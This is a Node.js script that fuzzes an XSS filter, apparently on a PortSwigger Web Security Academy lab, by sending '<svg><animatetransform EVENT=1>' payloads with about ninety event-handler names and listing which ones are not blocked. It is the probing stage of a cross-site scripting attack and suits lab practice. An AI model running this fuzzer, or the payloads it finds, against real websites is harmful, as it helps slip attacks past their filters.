const axios = require('axios');

// List of event handlers to fuzz
const eventHandlers = [
  'onafterprint', 'onafterscriptexecute', 'onanimationcancel', 'onanimationend',
  'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut',
  'onbeforeinput', 'onbeforepaste', 'onbeforeprint', 'onbeforescriptexecute',
  'onbeforetoggle', 'onbeforeunload', 'onblur', 'onclick',
  'oncontentvisibilityautostatechange', 'oncontentvisibilityautostatechange(hidden)',
  'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend',
  'ondragenter', 'ondragexit', 'ondragleave', 'ondragover', 'ondragstart',
  'ondrop', 'onerror', 'onfocus', 'onfocus(autofocus)', 'onfocusin',
  'onfocusout', 'ongesturechange', 'ongestureend', 'ongesturestart',
  'onhashchange', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onmessage',
  'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout',
  'onmouseover', 'onmouseup', 'onmousewheel', 'onpagehide', 'onpagereveal',
  'onpageshow', 'onpageswap', 'onpaste', 'onpointercancel', 'onpointerdown',
  'onpointerenter', 'onpointerleave', 'onpointermove', 'onpointerout',
  'onpointerover', 'onpointerrawupdate', 'onpointerup', 'onpopstate',
  'onresize', 'onscroll', 'onscrollend', 'onscrollsnapchanging',
  'onsecuritypolicyviolation', 'onselectionchange', 'onselectstart',
  'ontoggle(popover)', 'ontouchcancel', 'ontouchend', 'ontouchmove',
  'ontouchstart', 'ontransitioncancel', 'ontransitionend', 'ontransitionrun',
  'ontransitionstart', 'onunhandledrejection', 'onunload', 'onwaiting(loop)',
  'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart',
  'onwebkitmouseforcechanged', 'onwebkitmouseforcedown', 'onwebkitmouseforceup',
  'onwebkitmouseforcewillbegin', 'onwebkittransitionend', 'onwebkitwillrevealbottom',
  'onwheel','onbegin'
];

// Base URL for testing
const baseUrl = 'https://0ad400fe03c6316a81e19ee8005c004b.h1-web-security-academy.net/?search=';

// Function to test a single event handler
async function testEventHandler(event) {
  // Sanitize event name for URL (replace special characters like parentheses)
  const sanitizedEvent = event.replace(/[()]/g, '');
  try {
    const response = await axios.get(`${baseUrl}<svg><animatetransform ${sanitizedEvent}=1>`);
    return {
      event,
      status: response.status,
      allowed: response.status !== 400 ? 'Allowed' : 'Not Allowed'
    };
  } catch (error) {
    return {
      event,
      status: error.response ? error.response.status : 'Error',
      allowed: error.response && error.response.status !== 400 ? 'Allowed' : 'Not Allowed'
    };
  }
}

// Main function to fuzz all event handlers
async function fuzzEvents() {
  console.log('Starting event handler fuzzing for <body> tag...\n');
  console.log('Event Handler'.padEnd(30) + 'Status'.padEnd(10) + 'Result');
  console.log('-'.repeat(50));

  const allowedEvents = [];
  const notAllowedEvents = [];

  for (const event of eventHandlers) {
    const result = await testEventHandler(event);
    console.log(`${result.event.padEnd(30)}${result.status.toString().padEnd(10)}${result.allowed}`);
    
    // Categorize event handlers
    if (result.allowed === 'Allowed') {
      allowedEvents.push(result.event);
    } else {
      notAllowedEvents.push(result.event);
    }

    // Add a small delay to avoid overwhelming the server
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  console.log('\nFuzzing completed.\n');
  console.log('Summary:');
  console.log(`Allowed Event Handlers (${allowedEvents.length}):`, allowedEvents.join(', '));
  console.log(`Not Allowed Event Handlers (${notAllowedEvents.length}):`, notAllowedEvents.join(', '));
}

// Run the fuzzer
fuzzEvents().catch(err => console.error('Error during fuzzing:', err));